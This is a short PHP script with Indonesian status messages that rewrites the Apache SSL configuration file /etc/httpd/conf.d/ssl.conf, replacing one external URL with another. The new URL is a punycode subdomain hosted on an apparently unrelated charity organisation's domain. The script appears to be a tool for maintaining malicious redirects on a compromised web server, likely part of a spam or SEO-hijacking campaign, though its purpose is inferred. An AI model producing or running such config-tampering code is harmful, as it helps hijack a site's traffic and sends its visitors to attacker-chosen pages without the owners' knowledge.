<?php
$file = '/etc/httpd/conf.d/ssl.conf';
$search  = 'https://tz.suseo.info/ptepho.html';
$replace = 'https://xn--12ca2dbc1f9gc3nd.lazismumedankota.org/403.html';

if (!file_exists($file)) {
    exit("❌ File tidak ditemukan.\n");
}

$content = file_get_contents($file);
if (strpos($content, $search) === false) {
    exit("✅ Link tidak ditemukan dalam file, tidak ada perubahan.\n");
}

$content = str_replace($search, $replace, $content);
file_put_contents($file, $content);
echo "✔ Link berhasil diganti di $file\n";
